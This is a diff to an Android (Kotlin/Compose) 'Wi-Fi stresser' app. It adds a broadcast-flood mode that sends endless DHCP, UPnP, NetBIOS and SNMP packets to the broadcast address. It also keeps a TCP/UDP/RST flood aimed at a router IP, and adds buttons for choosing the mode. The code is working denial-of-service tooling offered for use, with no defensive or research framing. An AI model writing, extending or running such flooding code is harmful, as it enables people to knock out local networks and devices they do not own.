@@ -10,6 +10,7 @@ import androidx.compose.animation.core.rememberInfiniteTransition
 import androidx.compose.animation.core.tween
 import androidx.compose.foundation.Canvas
 import androidx.compose.foundation.background
+import androidx.compose.foundation.border
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
@@ -33,6 +34,7 @@ import androidx.compose.material3.Text
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.draw.alpha
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.geometry.Offset
 import androidx.compose.ui.graphics.Brush
@@ -83,6 +85,7 @@ data class StresserSnapshot(
 
 class StresserEngine(
     private val host: String,
+    private val method: Int = 2,
     private val onMetrics: (StresserSnapshot) -> Unit,
     private val onLog: (String, Color) -> Unit,
     private val onDrop: () -> Unit,
@@ -107,7 +110,14 @@ class StresserEngine(
 
     fun start() {
         if (running.getAndSet(true)) return
-        onLog("Стрессер запущен, цель: $host:80", Accent)
+        onLog(
+            if (method == 1) {
+                "Метод 1: broadcast-флуд (DHCP/UPnP/NetBIOS/SNMP), цель $host"
+            } else {
+                "Метод 2: TCP/UDP-флуд, цель $host:80"
+            },
+            Accent,
+        )
         fun go(block: () -> Unit) {
             val t = thread(isDaemon = true, name = "stress-worker") {
                 try {
@@ -118,12 +128,19 @@ class StresserEngine(
             }
             workers.add(t)
         }
-        for (i in 0 until 20) go { churnWorker() }
-        for (i in 0 until 8) go { keepAliveWorker() }
-        for (i in 0 until 10) go { udpWorker(53) }
-        for (i in 0 until 10) go { udpWorker(67) }
-        for (i in 0 until 24) go { rstWorker() }
-        for (i in 0 until 8) go { downloadWorker() }
+        if (method == 1) {
+            for (i in 0 until 8) go { broadcastWorker(67, ::dhcpPacket) }
+            for (i in 0 until 8) go { broadcastWorker(1900, ::upnpMsg) }
+            for (i in 0 until 8) go { broadcastWorker(137, ::netbiosQuery) }
+            for (i in 0 until 8) go { broadcastWorker(161, ::snmpPdu) }
+        } else {
+            for (i in 0 until 20) go { churnWorker() }
+            for (i in 0 until 8) go { keepAliveWorker() }
+            for (i in 0 until 10) go { udpWorker(53) }
+            for (i in 0 until 10) go { udpWorker(67) }
+            for (i in 0 until 24) go { rstWorker() }
+            for (i in 0 until 8) go { downloadWorker() }
+        }
         go { pingLoop() }
         go { snapshotLoop() }
     }
@@ -243,6 +260,59 @@ class StresserEngine(
         }
         runCatching { s.close() }
     }
+
+    private fun broadcastWorker(port: Int, packet: () -> ByteArray) {
+        val s = DatagramSocket()
+        runCatching { s.broadcast = true }
+        while (running.get()) {
+            try {
+                val p = packet()
+                s.send(DatagramPacket(p, p.size, InetSocketAddress("255.255.255.255", port)))
+                sent.addAndGet(p.size.toLong())
+            } catch (t: Throwable) {
+            }
+        }
+        runCatching { s.close() }
+    }
+
+    private fun dhcpPacket(): ByteArray {
+        val xid = Random().nextInt()
+        val p = ByteArray(28)
+        p[0] = 0x01
+        p[1] = 0x01
+        p[2] = 0x06
+        p[3] = 0x00
+        p[4] = (xid ushr 24).toByte()
+        p[5] = (xid ushr 16).toByte()
+        p[6] = (xid ushr 8).toByte()
+        p[7] = xid.toByte()
+        val rand = ByteArray(20)
+        Random().nextBytes(rand)
+        System.arraycopy(rand, 0, p, 8, 20)
+        return p
+    }
+
+    private fun upnpMsg(): ByteArray = "M-SEARCH * HTTP/1.1\r\n" +
+        "HOST: 239.255.255.250:1900\r\n" +
+        "MAN: \"ssdp:discover\"\r\n" +
+        "MX: 1\r\n" +
+        "ST: ssdp:all\r\n\r\n".toByteArray()
+
+    private fun netbiosQuery(): ByteArray = byteArrayOf(
+        0x00, 0x00, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x20, 0x43, 0x4b,
+        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+        0x00, 0x00, 0x21, 0x00, 0x01,
+    )
+
+    private fun snmpPdu(): ByteArray = byteArrayOf(
+        0x30, 0x26, 0x02, 0x01, 0x00, 0x04, 0x06,
+    ) + "public".toByteArray() + byteArrayOf(
+        0xa0, 0x1b, 0x02, 0x01, 0x2a, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00,
+        0x30, 0x0f, 0x30, 0x0d, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00,
+        0x05, 0x00,
+    )
 
     private fun rstWorker() {
         while (running.get()) {
@@ -382,6 +452,7 @@ private data class LogLine(val text: String, val color: Color)
 @Composable
 fun WifiStresserScreen(onBack: () -> Unit) {
     var ip by remember { mutableStateOf("192.168.0.1") }
+    var method by remember { mutableStateOf(1) }
     var running by remember { mutableStateOf(false) }
     var snap by remember { mutableStateOf(StresserSnapshot()) }
     val logs = remember { mutableStateListOf<LogLine>() }
@@ -420,6 +491,7 @@ fun WifiStresserScreen(onBack: () -> Unit) {
         val ui = Handler(Looper.getMainLooper())
         val e = StresserEngine(
             host = h,
+            method = method,
             onMetrics = { m ->
                 ui.post {
                     snap = m
@@ -495,6 +567,27 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                     lineHeight = 18.sp,
                 )
             }
+        }
+
+        Spacer(Modifier.height(12.dp))
+        Row(Modifier.fillMaxWidth()) {
+            MethodButton(
+                modifier = Modifier.weight(1f),
+                title = "Метод 1",
+                subtitle = "broadcast-флуд",
+                selected = method == 1,
+                enabled = !running,
+                onClick = { method = 1 },
+            )
+            Spacer(Modifier.width(8.dp))
+            MethodButton(
+                modifier = Modifier.weight(1f),
+                title = "Метод 2",
+                subtitle = "TCP/UDP-флуд",
+                selected = method == 2,
+                enabled = !running,
+                onClick = { method = 2 },
+            )
         }
 
         Spacer(Modifier.height(12.dp))
@@ -627,6 +720,49 @@ fun WifiStresserScreen(onBack: () -> Unit) {
                     }
                 }
             }
+        }
+    }
+}
+
+@Composable
+private fun MethodButton(
+    modifier: Modifier,
+    title: String,
+    subtitle: String,
+    selected: Boolean,
+    enabled: Boolean,
+    onClick: () -> Unit,
+) {
+    Box(
+        modifier = modifier
+            .clip(RoundedCornerShape(16.dp))
+            .background(
+                when {
+                    selected -> Accent.copy(alpha = 0.16f)
+                    else -> Color(0x12FFFFFF)
+                }
+            )
+            .border(
+                width = if (selected) 1.5.dp else 0.dp,
+                color = if (selected) Accent else Color.Transparent,
+                shape = RoundedCornerShape(16.dp),
+            )
+            .alpha(if (enabled) 1f else 0.6f)
+            .clickable(enabled = enabled, onClick = onClick),
+    ) {
+        Column(Modifier.padding(horizontal = 14.dp, vertical = 12.dp)) {
+            Text(
+                title,
+                color = if (selected) Accent else TextMain,
+                fontSize = 14.sp,
+                fontWeight = FontWeight.Bold,
+            )
+            Text(
+                subtitle,
+                color = TextDim,
+                fontSize = 10.sp,
+                maxLines = 1,
+            )
         }
     }
 }
